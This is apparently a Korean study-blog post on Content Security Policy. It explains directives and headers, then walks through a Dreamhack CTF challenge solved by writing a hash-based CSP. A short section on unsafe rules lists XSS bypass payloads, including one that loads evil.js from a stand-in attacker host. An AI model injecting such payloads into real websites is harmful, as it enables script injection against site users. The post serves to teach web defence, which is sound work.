🔗https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass 포스트 참고

<br>

> 💡 **콘텐츠 보안 정책(CSP)은 주로 크로스 사이트 스크립팅(XSS)과 같은 공격으로부터 보호하는** 것을 목표로 하는 브라우저 기술

<br>

### 구현

- 응답 헤더
    
    ```jsx
    Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
    ```
    
- 메타 태그
    
    ```jsx
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
    ```

<br>

### 헤더

- `Content-Security-Policy` : CSP를 시행하여 브라우저가 **모든 위반 사항을 차단**
- `Content-Security-Policy-Report-Only` : 모니터링에 사용됨. **차단하지 않고** 위반 사항을 보고

<br>

### 리소스 정의

CSP는 액티브 및 패시브 콘텐츠 모두의 **로딩을 위한 출처를 제한**하고 **인라인 JavaScript 실행**을 제어

```jsx
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```

- `self` : 같은 도메인에서의 로딩 허용
- `none` : 모두 차단
- **`unsafe-eval`** : eval() 허용하지만 보안상의 이유로 권장X
- **`unsafe-inline`** : <script> 또는 <style>과 같은 인라인 리소스의 사용을 허용하지만 보안상의 이유로 권장X
- `nonce-...` : 스크립트에 직접 암호를 지정하는 방식
- host : 특정 호스트 허용
- strict-origin : 소스의 프로토콜 보안 수준이 문서와 일치하는지 확인

<br>

## **안전하지 않은 CSP Rules**


### **unsafe-inline**

```jsx
script-src https://google.com 'unsafe-inline'; 
```

⇒ `"/><script>alert(1);</script>` 로 우회 가능 

<br>

### 와일드카드

```jsx
script-src 'self' https://google.com https: data *****;
```

(1) ⇒ `"/>'><script src=https://attacker-website.com/evil.js></script>`

(2) ⇒ `"/>'><script src=data:text/javascript,alert(1337)></script>`

로 우회 가능 

등등.. 🔗 [여기](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#unsafe-csp-rules)에 정말 많은 취약한 CSP Rule에 대한 설명이 있다. 

<br>

---

### 응용 - 드림핵 file-csp-1 문제 풀이

```python
...
try:
    a = driver.execute_script('return a()');
except:
    a = 'error'
try:
    b = driver.execute_script('return b()');
except:
    b = 'error'
try:
    c = driver.execute_script('return c()');
except Exception as e:
    c = 'error'
    c = e
try:
    d = driver.execute_script('return $(document)'); #jQuery 문법 
except:
    d = 'error'

if a == 'error' and b == 'error' and c == 'c' and d != 'error':
    return FLAG
...
```

a, b == error  , c == allow , d≠error 일 때 FLAG가 출력된다.

<br>

```html
<!-- block me -->
<script>
	function a() { return 'a'; }
	document.write('a: block me!<br>');
</script>

<!-- block me -->
	<script nonce="i_am_super_random">
	function b() { return 'b'; }
	document.write('b: block me!<br>');
</script>

<!-- allow me -->
<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha256-pasqAKBDmFT4eHoN2ndd6lN370kFiGUFyTiUHWhU7k8=" crossorigin="anonymous"></script>

<!-- allow me -->
<script nonce="i_am_super_random">
	function c() { return 'c'; }
	document.write('c: allow me!<br>');
	try { $(document); document.write('jquery: allow me!<br>'); } catch (e) {  }
</script>
```

<br>

우선 다 차단시키는 `script-src 'none` 를 입력하면 console에 여러 에러가 뜬다.

```python
Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'none'". Either the 'unsafe-inline' keyword, a hash ('sha256-P9oV1Sc7O1Di7wEu1Q0fc9Jb2+DopNb6840c7E5XuNY='), or a nonce ('nonce-...') is required to enable inline execution.
```

```python
Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'none'". Either the 'unsafe-inline' keyword, a hash ('sha256-Pl2V1+QPNtARvuHPfLjHPFJ5rA0Ky2MhOJ8KD2Y0zN8='), or a nonce ('nonce-...') is required to enable inline execution
```

```python
Refused to load the script 'https://code.jquery.com/jquery-3.4.1.slim.min.js' because it violates the following Content Security Policy directive: "script-src 'none'". Note that 'script-src-elem' was not explicitly set, so 'script-src' is used as a fallback.
```

```python
Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'none'". Either the 'unsafe-inline' keyword, a hash ('sha256-l1OSKODPRVBa1/91J7WfPisrJ6WCxCRnKFzXaOkpsY4='), or a nonce ('nonce-...') is required to enable inline execution.
```

다음의 콘텐츠 보안 정책 지침을 위반하기 때문에 인라인 스크립트를 실행하는 것을 거부했습니다. . .

스크립트 로드가 거부되었습니다. . . ⇒ d는 jQuery인데 none을 할 경우 jQuery조차 차단되어 에러가 뜨는 것 같다. 

<br>

해당 메시지를 통해 a,b,c의 SHA265 해시값을 얻을 수 있다.

a - sha256-P9oV1Sc7O1Di7wEu1Q0fc9Jb2+DopNb6840c7E5XuNY=

b- sha256-Pl2V1+QPNtARvuHPfLjHPFJ5rA0Ky2MhOJ8KD2Y0zN8=

c- sha256-l1OSKODPRVBa1/91J7WfPisrJ6WCxCRnKFzXaOkpsY4=

<br>

c는 참이어야 하기 때문에 script-src 를 작성할 때 해당 c는 허용시킨다.

`script-src 'sha256-l1OSKODPRVBa1/91J7WfPisrJ6WCxCRnKFzXaOkpsY4='`


위 스크립트를 입력하면 c : allow가 되고나머지 a,b에 대한 error만 뜬다 

<br>

d또한 jQuery를 로드하기 위해 참이 되어야 함으로 `script-src 'sha256-l1OSKODPRVBa1/91J7WfPisrJ6WCxCRnKFzXaOkpsY4=' 'sha256-pasqAKBDmFT4eHoN2ndd6lN370kFiGUFyTiUHWhU7k8='` 를 입력한다. 

(src 두 개는 공백으로 구분한다.)
